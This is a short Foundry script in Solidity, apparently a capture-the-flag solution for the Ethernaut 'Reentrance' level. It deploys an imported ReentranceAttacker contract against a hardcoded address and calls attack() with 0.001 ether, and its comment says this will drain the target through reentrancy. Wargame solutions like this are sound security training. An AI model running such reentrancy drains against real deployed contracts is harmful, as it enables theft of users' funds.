// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.6.12;

import "../src/10-Reentrance.sol";
import "../levels/10-Reentrance.sol";
import "forge-std/Script.sol";

contract Attack is Script {
    function run() external{
        vm.startBroadcast();

        // Create ReentranceAttacker instance
        ReentranceAttacker reentranceAttacker = new ReentranceAttacker(payable(0x56546205BA275F63d5A0606799CEBE3F91066139));

        // Donate, withdraw, and have the receive() function drain the contract
        reentranceAttacker.attack{value: .001 ether}();

        vm.stopBroadcast();
    }
}